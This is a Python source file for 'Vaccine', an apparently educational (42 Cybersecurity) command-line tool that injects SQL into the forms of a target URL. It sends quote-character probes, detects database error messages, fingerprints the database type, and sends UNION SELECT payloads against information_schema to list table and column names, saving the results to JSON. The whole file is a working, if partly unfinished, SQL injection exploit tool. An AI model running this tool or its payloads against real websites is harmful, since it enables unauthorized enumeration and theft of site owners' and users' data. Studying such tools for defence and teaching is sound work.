#!/usr/bin/env python3

import argparse
import requests
import logging
from pprint import pprint
from payloads import payloadsList
from urllib.parse import urljoin
from bs4 import BeautifulSoup as bs
from colorama import init, Fore, Style
import json
import sys

# Initialize colorama
init()

# Global variables
database = 'Not found'
database_found = 'False'

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Keep session open and set headers
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Win64; x64) AppleWebKit/537.36 Chrome/87.0.4280.88"

def get_forms(url):
    """
    Fetch all forms from the given URL.
    """
    q = bs(s.get(url).content, "html.parser")
    return q.find_all("form")

def get_form_details(form):
    """
    Extract and return form details including action, method, and inputs.
    """
    detailsOfForm = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    detailsOfForm["action"] = action
    detailsOfForm["method"] = method
    detailsOfForm["inputs"] = inputs
    return detailsOfForm

def vulnerable(response, result):
    """
    Check if the response contains SQL injection errors.
    """
    errors = {
        "you have an error in your sql syntax;",
        "warning: mysql",
        ": syntax error",
        "unrecognized token"
    }
    for error in errors:
        if error in response.content.decode().lower():
            if database_found == 'False':
                resultCheckDb = ft_check_db(response)
                result.update(resultCheckDb)
            return True
    return False

def ft_check_db(response):
    """
    Identify the database type based on error messages in the response.
    """
    result = {}
    global database, database_found
    if database_found == 'False':
        if "mariadb" in response.content.decode().lower():
            database = "MariaDB"
        elif "mysql" in response.content.decode().lower():
            database = "MySQL"
        elif "sqlite" in response.content.decode().lower():
            database = "SQLite"
        elif "microsoft sql server" in response.content.decode().lower():
            database = "SQL Server"
        if database != 'Not found':
            database_found = "True"
        if database_found == 'True':
            result["databases"] = database
    return result


def extract_table_names(response):
    """
    Extract table names using SQL injection.
    """
    tables = []
    if "table_name" in response.content.decode().lower():
        soup = bs(response.content, "html.parser")
        tables = [tag.text for tag in soup.find_all("table_name")]
    return tables

def extract_column_names(response):
    """
    Extract column names using SQL injection.
    """
    columns = []
    if "column_name" in response.content.decode().lower():
        soup = bs(response.content, "html.parser")
        columns = [tag.text for tag in soup.find_all("column_name")]
    return columns

def save_results(results, output_file):
    """
    Save the results to a specified output file in a readable format.
    """
    formatted_results = {
        "URL": results["url"],
        "Vulnerable": results["vulnerable"],
        "Payloads": []
    }

    for payload in results["payloads"]:
        formatted_payload = {
            "payload": payload["payload"],
            "response": format_response(payload["response"]),
            "vulnerable_parameters": payload.get("vulnerable_parameters", []),
            "database_info": payload.get("database_info", {}),
            "table_info": payload.get("table_info", {}),
            "column_info": payload.get("column_info", {}),
            "complete_dump": payload.get("complete_dump", "")
        }
        formatted_results["Payloads"].append(formatted_payload)

    if results.get("database_name") or results.get("database_version") or results.get("databases"):
        formatted_results["Database Information"] = {
            "Name": results.get("database_name"),
            "Version": results.get("database_version"),
            "Detected Databases": results.get("databases", [])
        }

    with open(output_file, 'w') as f:
        json.dump(formatted_results, f, indent=4, ensure_ascii=False)
    print(Fore.GREEN + f"Results saved to {output_file}" + Style.RESET_ALL)

def format_response(response_text):
    """
    Extract and format the response details.
    """
    lines = response_text.split('\n')
    error_line = next((line for line in lines if 'Fatal error' in line), None)
    file_line = next((line for line in lines if ' in ' in line), None)
    stack_trace = [line for line in lines if line.startswith('#')]

    if not error_line or not file_line:
        return {
            "raw_response": response_text
        }

    error_type = error_line.split(': ')[1].split(':')[0].strip()
    error_message = ': '.join(error_line.split(': ')[2:]).strip()
    file_info = file_line.split(' in ')[1]

    if ' on line ' in file_info:
        file_path, line_info = file_info.split(' on line ')
        line_number = int(line_info.strip())
    else:
        file_path = file_info.strip()
        line_number = None

    formatted_response = {
        "error_type": error_type,
        "error_message": error_message,
        "file": file_path
    }
    
    if line_number is not None:
        formatted_response["line"] = line_number
    
    formatted_response["stack_trace"] = stack_trace

    return formatted_response

def submit_form(form_details, url, payload, method):
    """
    Submit the form with the given payload.
    """
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input_tag in form_details["inputs"]:
        if input_tag["type"] == "text" or input_tag["type"] == "search":
            data[input_tag["name"]] = payload
        else:
            data[input_tag["name"]] = "test"
    if method == "POST":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def ft_injection_sql(url, method, form):
    """
    Perform SQL injection on the given form.
    """
    result = {"payloads": []}
    for p_type in payloadsList:
        for i in payloadsList[p_type]:
            form_details = get_form_details(form)
            response = submit_form(form_details, url, i, method)
            vulnerabilities = vulnerable(response, result)
            if vulnerabilities:
                vulnerable_payload = {
                    "payload": i,
                    "response": response.text,
                    "vulnerable_parameters": [input_tag["name"] for input_tag in form_details["inputs"]],
                    "database_info": {},
                    "table_info": {},
                    "column_info": {},
                    "complete_dump": ""
                }

                if database_found == 'True':
                    vulnerable_payload["database_info"] = {
                        "name": database
                    }

                    # Extract table names using SQL injection
                    table_response = submit_form(form_details, url, " UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()-- ", method)
                    table_names = extract_table_names(table_response)
                    vulnerable_payload["table_info"] = {"table_names": table_names}

                    # Extract column names using SQL injection for each table
                    for table in table_names:
                        column_response = submit_form(form_details, url, f" UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'-- ", method)
                        column_names = extract_column_names(column_response)
                        vulnerable_payload["column_info"][table] = column_names

                    # Optionally, perform a complete database dump if feasible
                    # This might require complex queries depending on the database structure
                    # vulnerable_payload["complete_dump"] = perform_complete_database_dump()

                result["payloads"].append(vulnerable_payload)
    return result

def detect_sql_injection(url, payloads, method):
    """
    Detect SQL injection vulnerabilities in the given URL.
    """
    forms = get_forms(url)
    results = {
        "url": url,
        "vulnerable": False,
        "payloads": [],
        "database_name": None,
        "database_version": None,
        "databases": []
    }

    for form in forms:
        form_details = get_form_details(form)
        for payload in payloads:
            method = method.upper()
            response = submit_form(form_details, url, payload, method)
            if vulnerable(response, results):
                results["vulnerable"] = True
                results["payloads"].append({
                    "payload": payload,
                    "response": response.text
                })
                resultsqlinjection = ft_injection_sql(url, method, form)
                if "payloads" in results and "payloads" in resultsqlinjection:
                    results["payloads"].extend(resultsqlinjection["payloads"])
                print(Fore.RED + f"Vulnerable to payload: {payload}" + Style.RESET_ALL)
            else:
                print(Fore.GREEN + f"Not vulnerable to payload: {payload}" + Style.RESET_ALL)

        if results["vulnerable"]:
            break

    return results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog='Vaccine',
        description='Vaccine which allows you to perform an SQL injection by providing a URL as parameter.',
        epilog='42 Cybersecurity')

    parser.add_argument('URL', type=str, help='The URL of the website to perform SQL injection')
    parser.add_argument('-o', type=str, default="archive.json", help='Archive file, if not specified it will be stored in a default one.')
    parser.add_argument('-X', type=str, default="GET", help='Type of request, if not specified GET will be used.')

    args = parser.parse_args()
    print(args)
    if args.X not in ['POST', 'GET']:
        print(Fore.RED + "Error: method not accepted" + Style.RESET_ALL)
        sys.exit(1)
        
    payloads = ["'", "\"", "`", "\\", "/*'*/", ")'"]
    results = detect_sql_injection(args.URL, payloads, args.X)
    save_results(results, args.o)

    if results["vulnerable"]:
        print(Fore.RED + "The site is vulnerable to SQL injection." + Style.RESET_ALL)
        if results["database_name"]:
            print(Fore.YELLOW + f"Database name: {results['database_name']}" + Style.RESET_ALL)
        if results["database_version"]:
            print(Fore.YELLOW + f"Database version: {results['database_version']}" + Style.RESET_ALL)
        if results["databases"]:
            print(Fore.YELLOW + f"Databases: {', '.join(results['databases'])}" + Style.RESET_ALL)
    else:
        print(Fore.GREEN + "The site is not vulnerable to SQL injection." + Style.RESET_ALL)